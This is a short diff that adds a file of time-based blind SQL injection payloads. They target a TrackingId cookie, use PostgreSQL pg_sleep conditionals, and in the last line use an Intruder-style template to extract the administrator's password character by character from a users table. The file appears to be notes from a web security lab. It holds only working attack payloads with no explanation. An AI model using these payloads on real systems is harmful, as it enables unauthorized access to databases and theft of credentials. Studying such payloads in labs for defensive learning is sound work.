@@ -1,0 +1,4 @@
+TrackingId=psyNzUy2dv76IPBM';select case when (1=1) then pg_sleep(10) else pg_sleep(0) end--;
+Cookie: TrackingId=psyNzUy2dv76IPBM' %3b select case when (1=1) then pg_sleep(10) else pg_sleep(0) end--;
+
+Cookie: TrackingId=psyNzUy2dv76IPBM' %3b select case when (username='administrator' and substring(password,§1§,1) = '§a§') then pg_sleep(10) else pg_sleep(0) end from users--;
